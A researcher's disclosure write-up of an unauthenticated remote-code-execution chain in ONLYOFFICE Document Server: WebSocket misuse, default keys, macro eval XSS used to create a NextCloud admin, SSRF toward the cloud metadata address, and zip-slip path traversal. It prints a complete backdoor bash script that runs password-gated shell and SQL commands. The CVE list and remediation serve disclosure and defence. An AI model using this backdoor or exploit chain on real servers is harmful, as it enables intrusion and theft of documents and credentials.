# Exploiting ONLYOFFICE Web Sockets for Unauthenticated Remote Code Execution

## Encountering OnlyOffice

About 18 months ago, I was conducting a pentest of a document management platform. It was designed with the goal of providing a secure document storage and sharing solution for some high impact use cases. In order to achieve a reliable MS Office document editing experience, the system was using [ONLYOFFICE](https://www.onlyoffice.com) as a plugin, resulting in (in my opinion) a slicker and more reliable editing experience than even the Office 365 web apps can manage.

I was curious though. For a web application that apparently did encryption at rest, at what point in the system does a blob of encrypted document become unencrypted and rendered in the browser? I decided to dig into the editor itself and work out what it was doing in the background. It turned out that the client side web application was requesting data from the web application in an internal format that client side code could parse into the document editor. I couldn't readily open that data in any offline document editor but it didn't appear to be encrypted, judging by the distinctly non-random series of characters that it featured.

![Internal OnlyOffice document data](img/editorbin.png)

So it seems that although this document manager was encrypting at rest, the keys to decrypt and process those documents were probably being passed around between the various components in order to handle those documents in the back end. Whilst problematic for the security claims of the document management system, I wanted to go deeper into the OnlyOffice component. Could this be exploited further?

The URLs for downloading this internal editor data were signed with MD5. This means that at some point, the application has to provide the user agent with that URL in order to download it. Testing session controls found that URL signing was the only access control implemented. This meant that if that URL was known, anyone could download the unencrypted document.

The URL was being provided through a WebSocket connection that the editor creates and maintains throughout the document editing process. I kept following the authentication flow back. How does the browser authenticate with that WebSocket? Usually when an application makes a WebSocket connection to the web server, it first makes an authenticated HTTP request to a known WebSocket endpoint and requests an upgrade (as per [RFC 6455](https://www.rfc-editor.org/rfc/rfc6455#page-6)). If the authentication is valid, the web server responds with a `HTTP 101 Switching Protocols` response message, e.g.

Request:

```
GET /websocket HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Sec-WebSocket-Version: 13
Origin: http://localhost
Sec-WebSocket-Key: L9so59gHCxrpsnU4SPOsbw==
Connection: keep-alive, Upgrade
Cookie: sessionid=4795fab306588141e027f642b63debfb
Pragma: no-cache
Cache-Control: no-cache
Upgrade: websocket
```

Response:

```
HTTP/1.1 101 Switching Protocols
Server: nginx/1.21.3
Date: Fri, 07 Jan 2022 17:32:04 GMT
Connection: upgrade
Upgrade: websocket
Sec-WebSocket-Accept: uKmC7JGNT7wAZhZFtiSO5nvf1A8=
```

By experimenting with the various headers in the opening request I found that the web server was happy to upgrade *any* incoming upgrade request, regardless of whether it had a session cookie or not i.e. the OnlyOffice WebSocket was completely unauthenticated.

Can we exploit that though? What other pieces of information do we need in order to download a document? Again, experimenting with the client's upgrade request, and various components of the WebSocket endpoint, it transpired that only the document identifier was required. The exploitability of this issue would entirely depend on how OnlyOffice was implemented. The document id might be a guarded secret, or it might leak in something as simple as a `referer` header. I looked for a way of weaponising this.

Elsewhere in the system I had identified a method of reflecting a cross site scripting payload. This could be used to scrape the contents of various document listings pages in the context of an authenticated user and send the document names and identifiers back to a malicious server. All that an attacker would need to do at this point is select an interesting document name and connect directly to the WebSocket endpoint for that document to download the document data which was referenced in the signed URLs that the websocket replied with.

![Proof of concept script connecting to the WebSocket](img/downloaddoc.png)

![Downloading unencrypted document data](img/downloadparts.png)

In terms of that pentest, this was quite satisfactory to make a judgement on the security posture of the overall system and was all that could be investigated within the timeframe available. OnlyOffice had piqued my interest though. I decided to pull at the thread a bit more and see if this was an implementation issue or something a bit more widespread.

## Pulling at the Thread

With the original document management application now out of scope, I needed another testbed which used OnlyOffice as an editing module underneath its own authentication model. I quickly found a [Docker compose configuration created by OnlyOffice](https://github.com/ONLYOFFICE/docker-onlyoffice-nextcloud) to implement OnlyOffice as the editor for the Nextcloud document management system. With a few tweaks to the original `downloaddoc.py` script, I was able to extract documents from Nextcloud through OnlyOffice. What else can you do through the WebSocket endpoint?

I explored the functionality of the document editor and found that basically all actions that are performed against the document are done through a WebSocket message, even down to the position of the cursor on the page. I looked for a few interesting features and found that OnlyOffice document editor features its own built-in chat client so that you can chat with people while working on the document that you're all looking at. That is very cool, but if we can connect to the WebSocket unauthenticated, how does it know what name to display in the chat message? It's simple, it's taken from the first message sent to the WebSocket, type "`auth`".

![Connecting as admin](img/auth_as_admin.png)

Change that value when you connect and any actions thereafter are done in whatever name you selected. I decided at this point it was worth taking the logic in `downloaddoc.py` and put it into a general OnlyOffice exploit tool. Imaginatively I called this tool `pwnlyoffice`.

Let's see how the "chat" command in `pwnlyoffice` looks when used against a known document id with someone already editing it...

![Interacting with document chat functions](img/pwnlyoffice_chat.png)

and in the UI...

![Apparently legitimate chat message](img/ui_chat.png)

OnlyOffice *does* feature protections against this kind of unauthenticated connection to its WebSocket endpoints, but they are not enabled by default. JWT signing is possible, however, also by default the signing key is the word "`secret`". This means that even if JWT signing is enabled, unless the default key is changed, it is still trivial to connect to the WebSocket unauthenticated. I looked at where else cyptographic signing might rely on a weak default key and indeed the MD5 signed URL which the editor downloads from is signed using the default string "`verysecretstring`". This means that with a known document id I could download directly from the server without even needing to connect to the WebSocket.

## Escalating Privileges

This is all good fun, but when we're targeting an organisation we're usually looking for more of a foothold than simply social engineering them. What we need is a method of pivoting out of the OnlyOffice document editor and into the wider document management service (in this instance, NextCloud). NextCloud modules are deployed in the same origin as NextCloud itself, so hopefully a nice breakout method would involve finding cross site scripting in OnlyOffice which could be executed against NextCloud. I didn't have to look far.

OnlyOffice document editor is full featured. It is squarely aimed at being a replacement for MS Office products and it does this very well. So well in fact that even some of the features that I would have thought best left in MS Office have also found their way into OnlyOffice, particularly **macros**. Unlike MS Office however, OnlyOffice doesn't attempt to include a VBA parser for backwards compatibility. OnlyOffice macros are implemented in JavaScript, as can be seen by the stub function that is created when you open the macro editor.

![Macro editor](img/macros.png)

Great, so now we're probably looking for some kind of sandbox escape that can get us out into arbitrary JS execution in the scope of NextCloud, right? No, [this is the code for executing a macro](https://github.com/ONLYOFFICE/sdkjs/blob/af81ea5f4c11aca013c90167e2b30b7dc9fdf559/common/macros.js#L124):

```javascript

	CDocumentMacros.prototype.run = function(sGuid)
	{
		try
		{
			var obj = JSON.parse(this.Data);
			if (!obj["macrosArray"])
				return;
			for (var i = 0; i < obj["macrosArray"].length; i++)
			{
				if (sGuid === obj["macrosArray"][i]["guid"])
				{
					var script = "(function(){ var Api = window.g_asc_plugins.api;\n" + obj["macrosArray"][i]["value"] + "\n})();";
					eval(script);
					break;
				}
			}
		}
		catch (err)
		{
		}
	};
```

Yes, just straight up `eval()` the macro right there in the browser, and because all actions against a document are done through the WebSocket, if we know a document id we can just inject some JavaScript right into that document to automatically run if someone opens it. After figuring out how macros were encoded, I added this functionality to `pwnlyoffice`:

![Injecting a macro into a known document id](img/pwnlyoffice_alertbox.png)

And after loading the document:

![Alert box generated](img/editor_alertbox.png)

So that works. Let's use it to get admin on NextCloud. In NextCloud you have to confirm your password to perform admin actions, however the HTTP request to confirm your password is actually separate from the admin action you're confirming, and is only required if you haven't confirmed your password in the last 30 minutes. So if you're scripting a malicious admin action as I am you can avoid this step and invisibly create an admin in the background by posting to the relevant URL. One extra step is required to get a CSRF token before the create step.

![Creating an admin via a macro](img/creating_admin.png)

and in the user management area, our admin is created for us:

![Admin created](img/admin_created.png)

## Exploiting the Document Converter

Now we're getting somewhere, if we know a document id it is feasible that we can poison a document and then get admin on a target's document management system. We still have to know a document id though, and these tend to be pretty hard to guess. What else will the WebSocket let us do? I noticed that when you connect to the WebSocket in a normal connection, the document server is provided a signed URL for the location of the **original document**. What can we do with that?

![The URL of the original document](img/auth_url.png)

As you might expect, this calls out to, downloads and then converts any URL you give it. So with my early experiments against Burp Collaborator, my document server was quickly filling up with documents containing the single random string that my collaborator URL was providing. It wasn't just handling document formats, the converter inside OnlyOffice could understand and convert between a wide variety of document formats. We therefore have a server side request forgery method that can `GET` any internal URL and render the contents for us in any format. Targeting an OnlyOffice instance in the cloud? Try hitting the http://169.254.169.254 meta-data service for some credentials and see if you can do some lateral movement! Scan around the internal network of an on-prem hosted instance and see if there are any unauthenticated wikis floating about. SSRF changes the scope a great deal.

Being able to convert any URL we like doesn't just mean being able to access previously unavailable resources, it also means that we can force the server to download from our own resources. Is it possible to create a document in some format that could be malicious to the server? 

Typical weaknesses when dealing with document parsing are:

1. XXE in parsing internal MS Office XML
2. Path traversal ("[Zip slip](https://snyk.io/research/zip-slip-vulnerability)") in extracting MS Office data
3. SSRF in rendering HTML to PDF or image

I followed the source code of the document converter to understand how it treated various formats and, having spent a lot of time determining that a path traversal vulnerability was present in the MS Office format parts of the code, I discovered that [this was already discovered in 2020](https://www.cvedetails.com/cve/CVE-2020-11536/). 

> An issue was discovered in ONLYOFFICE Document Server 5.5.0. An attacker can craft a malicious .docx file, and exploit the unzip function to rewrite a binary and remotely execute code on a victim's server.

## Arbitrary File Write

Always do a bit of research first, kids! Surprisingly, it doesn't look like there was much of an attempt to correct this vulnerability. It's a fairly classic path traversal flaw at its core. MS Office formats (after 2007) are simply zip files with a standard file structure containing XML files and anything else that is embedded such as images. The document converter used by OnlyOffice converts an MS Office file and extracts it to a temporary location, writing any files within it out to a location **relative to that temp directory**. After the conversion is complete, the temp directory is deleted, but crucially if a file within the zip has path traversal characters ("../"), these can be used to write to any location on the document server which is writable by the web server.

I tested this out by taking a legitimate DOCX file and adding to it a small file with the path `../../../../../../../../../../tmp/test`. I hosted this on a local webserver and then prompted the document server to download it via the unauthenticated WebSocket. Sure enough, jumping into the Docker container running the document server, there was the file `test`, sitting in `/tmp/`.

## Exploiting for Code Execution

Now to exploit this. I thought quite a nice way of exploiting remote code execution would be to backdoor the document converter tool so that all of the command and control traffic could simply just flow over the same WebSocket channel that we were already using. This included the added bonus that it did not appear that WebSocket messages were being logged. I looked into the document converter, and the binary central to it all, called `x2t`. For some reason it wasn't possible to overwrite `x2t` itself during document conversion, so inside the Docker container for the document server I enumerated the dynamic libraries that `x2t` used or, more specifically, which binaries it was searching for and **not** finding in locations that I could write to using the path traversal vulnerability:

```bash
strace ./x2t 2>&1 | grep "No such" | grep -o "[^ ]\+\.so"
```
```
"/var/www/onlyoffice/documentserver/server/FileConverter/bin/tls/haswell/x86_64/libgraphics.so
"/var/www/onlyoffice/documentserver/server/FileConverter/bin/tls/haswell/libgraphics.so
"/var/www/onlyoffice/documentserver/server/FileConverter/bin/tls/x86_64/libgraphics.so
"/var/www/onlyoffice/documentserver/server/FileConverter/bin/tls/libgraphics.so
"/var/www/onlyoffice/documentserver/server/FileConverter/bin/haswell/x86_64/libgraphics.so
"/var/www/onlyoffice/documentserver/server/FileConverter/bin/haswell/libgraphics.so
"/var/www/onlyoffice/documentserver/server/FileConverter/bin/x86_64/libgraphics.so
*"/var/www/onlyoffice/documentserver/server/FileConverter/bin/libpthread.so
"/var/www/onlyoffice/documentserver/server/FileConverter/bin/system/tls/haswell/x86_64/libpthread.so
"/var/www/onlyoffice/documentserver/server/FileConverter/bin/system/tls/haswell/libpthread.so
"/var/www/onlyoffice/documentserver/server/FileConverter/bin/system/tls/x86_64/libpthread.so
"/var/www/onlyoffice/documentserver/server/FileConverter/bin/system/tls/libpthread.so
"/var/www/onlyoffice/documentserver/server/FileConverter/bin/system/haswell/x86_64/libpthread.so
"/var/www/onlyoffice/documentserver/server/FileConverter/bin/system/haswell/libpthread.so
"/var/www/onlyoffice/documentserver/server/FileConverter/bin/system/x86_64/libpthread.so
"/var/www/onlyoffice/documentserver/server/FileConverter/bin/system/libpthread.so
"/var/www/onlyoffice/documentserver/server/FileConverter/bin/libm.so
"/var/www/onlyoffice/documentserver/server/FileConverter/bin/libc.so
"/var/www/onlyoffice/documentserver/server/FileConverter/bin/libgcc_s.so
"/var/www/onlyoffice/documentserver/server/FileConverter/bin/libdl.so
"/var/www/onlyoffice/documentserver/server/FileConverter/bin/libdl.so
"/var/www/onlyoffice/documentserver/server/FileConverter/bin/libstdc++.so
"/var/www/onlyoffice/documentserver/server/FileConverter/bin/libstdc++.so
```

Fortunately, the `FileConverter/bin` directory was writable by the web service user. I selected `libpthread.so` as a file to create and used MSF Venom to create a simple `.so` payload which copied a script over `x2t`. This was packaged along with the backdoor script (and a backup version of `x2t` just to not completely break the server in case anything goes wrong).

![Structure of the backdoor docx](img/backdoordocx_structure.png)

The backdoor script itself takes the title parameter from the document conversion task, checks to see if it has the right password and then executes the rest of the string as a bash command. The output of the command is then swapped into the input for the document conversion job so that if we were to download the signed URL which is generated after the conversion job, it would contain the output of our command.

I realised an SQL shell would also be kind of handy for listing out document ids, so I added that in as well.

```bash
#!/usr/bin/env bash

# Overwritten for a binary then calls the original binary

# Get title
title=$(grep -o "<m_sTitle>.*</m_sTitle>" $1 | cut -d\> -f 2- | rev | cut -d \< -f 2- | rev | sed 's/&nbsp;/ /g; s/&amp;/\&/g; s/&lt;/\</g; s/&gt;/\>/g; s/&quot;/\"/g; s/#&#39;/\'"'"'/g; s/&ldquo;/\"/g; s/&rdquo;/\"/g;')

# Get tmp input file path
infile=$(grep -o "<m_sFileFrom>.*</m_sFileFrom>" $1 | cut -d\> -f 2- | rev | cut -d \< -f 2- | rev)
# cat $1 > /tmp/out
# echo $title >> /tmp/out
# echo $infile >> /tmp/out

# Test to see if this is a backdoor command
cmdtype=$(echo $title | cut -d: -f 1)
password=$(echo $title | cut -d: -f 2)
cmd=$(echo $title | cut -d: -f 3-)
if [[ $password == {PASSWORD} ]]; then
  # echo "Command: $cmd" >> /tmp/out
  case $cmdtype in
  "SHELL")
    eval $cmd > $infile
    ;;
  "SQL")
    psql postgresql://onlyoffice:onlyoffice@localhost/onlyoffice -o $infile -c "$cmd"
    ;;
  esac
 #  cat $infile >> /tmp/out
fi

# Get dir this is executed in
SCRIPT_DIR="$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
# echo $SCRIPT_DIR >> /tmp/out

# Delete shelled .so file if it exists
SOFILE=$SCRIPT_DIR/libpthread.so.0
if [[ -f "$SOFILE" ]]; then
  rm $SOFILE
fi

# Call original bin with original arguments
$SCRIPT_DIR/x2t.new $@
```

## Putting it all together: Unauthenticated Remote Code Execution

So, the full chain of exploits is as follows:

1. Connect to the WebSocket without authentication
2. Request that the server downloads and converts a document that we host
3. The document writes a Linux binary into a known path using path traversal
4. The binary is loaded and executed, installing a backdoor into the document converter
5. Calls to the document converter containing the right keywords and arguments are then executed as system commands.

Here's how that looks to the user of `pwnlyoffice`

![Getting unauthenticated RCE](img/shell.png)

And the SQL shell, being used to extract a list of valid document ids:

![SQL Shell](img/sql_shell.png)

## CVEs Assigned

In total, 6 CVEs were generated from this research:

1. CVE-2021-43447: Unauthenticated Websocket
2. CVE-2021-43445: Default JWT signing key
3. CVE-2021-43444: Default download URL signing key
4. CVE-2021-43448: Web socket tampering (e.g. user names)
5. CVE-2021-43446: XSS in macros
6. CVE-2021-43449: SSRF in "auth" websocket command

In addition, I logged a bug report with [NextCloud](https://nextcloud.com/)'s [HackerOne program](https://hackerone.com/nextcloud) regarding the ability to create a new admin without supplying a valid admin password, however the 30 minute window with which you can carry out admin actions without supplying your password was deemed to be functionality as intended.

## Remediation

If at all possible, update to version 7.2 of OnlyOffice.

If an upgrade is for any reason not possible, you will need to mitigate against these vulnerabilities as follows:

1. Enable JWT signed WebSocket commands and **ensure that a long, randomly generated key is used**: <https://api.onlyoffice.com/editors/signature/>
2. Set a long, randomly generated key for download URL signing: <https://api.onlyoffice.com/editors/nextcloud>
3. Disable the Macros plugin: <https://api.onlyoffice.com/editors/config/editor/customization#macros>
4. Disable the "chat" plugin: <https://api.onlyoffice.com/editors/config/editor/customization#chat>
5. Ensure that OnlyOffice document server is separated from all other non-essential systems at the network layer. i.e. document server should not be able to call out to the external Internet, or make internal calls to anything other than the intended document management system. It should especially not be able to contact the IP address `169.254.169.254` if you are hosting OnlyOffice in a cloud environment.
6. For all OnlyOffice containers, ensure that the user which the web service is running as (e.g. `ds`) can only write to the temp folder. In particular, ensure that it cannot write to `/var/www/onlyoffice`, or wherever your document server is installed.
7. Do not allow untrusted documents to be inserted directly into OnlyOffice, e.g. through a publicly available document upload portal.

## Timeline

- 2020-09-24: Original awareness of OnlyOffice 
- 2021-10-05: Research into OnlyOffice
- 2021-10-18: Disclosure of vulnerabilities to OnlyOffice
- 2021-11-18: Application for 6 CVEs with MITRE
- 2021-12-17: Assigned 6 CVEs
- 2022-01-07: Produced PoC for automated unauthenticated RCE
- 2022-09-26: Fix released in [version 7.2](https://www.onlyoffice.com/blog/2022/09/onlyoffice-docs-7-2/)
